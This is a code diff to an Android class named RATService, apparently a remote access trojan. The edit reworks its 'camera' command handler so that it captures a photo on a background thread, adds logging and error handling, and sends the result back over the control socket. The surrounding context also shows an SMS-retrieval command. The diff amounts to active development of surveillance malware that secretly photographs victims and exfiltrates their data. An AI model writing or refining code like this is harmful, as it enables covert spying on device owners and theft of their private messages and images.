@@ -554,23 +554,31 @@ public class RATService extends Service {
                 break;
                 
          // In routeCommand() for camera:
-case "camera":
-case "camera_photo":
-    if (cameraModule != null) {
-        Log.d(TAG, "Executing camera capture");
-        
-        // Run camera capture on background thread to avoid blocking the socket
-        executor.submit(() -> {
-            String result = cameraModule.takePhoto();
-            sendCommand("CAMERA|" + result);
-        });
-        
-        // Send immediate acknowledgment
-        sendCommand("CAMERA|Processing...");
-    } else {
-        sendCommand("CAMERA|ERROR: Camera module not available");
-    }
-    break;
+   case "camera":
+        case "camera_photo":
+            if (cameraModule != null) {
+                Log.d(TAG, "📸 Executing camera capture");
+                
+                // Send immediate acknowledgment
+                sendCommand("CAMERA|Processing...");
+                
+                // Run camera capture on background thread to avoid blocking the socket
+                executor.submit(() -> {
+                    try {
+                        Log.d(TAG, "📸 Calling cameraModule.takePhoto()");
+                        String result = cameraModule.takePhoto();
+                        Log.d(TAG, "📸 Camera result: " + (result != null ? result.substring(0, Math.min(50, result.length())) : "null"));
+                        sendCommand("CAMERA|" + result);
+                    } catch (Exception e) {
+                        Log.e(TAG, "❌ Error in camera capture", e);
+                        sendCommand("CAMERA|ERROR: " + e.getMessage());
+                    }
+                });
+            } else {
+                Log.e(TAG, "❌ Camera module not available");
+                sendCommand("CAMERA|ERROR: Camera module not available");
+            }
+            break;
                 
             case "sms":
             case "get_sms":
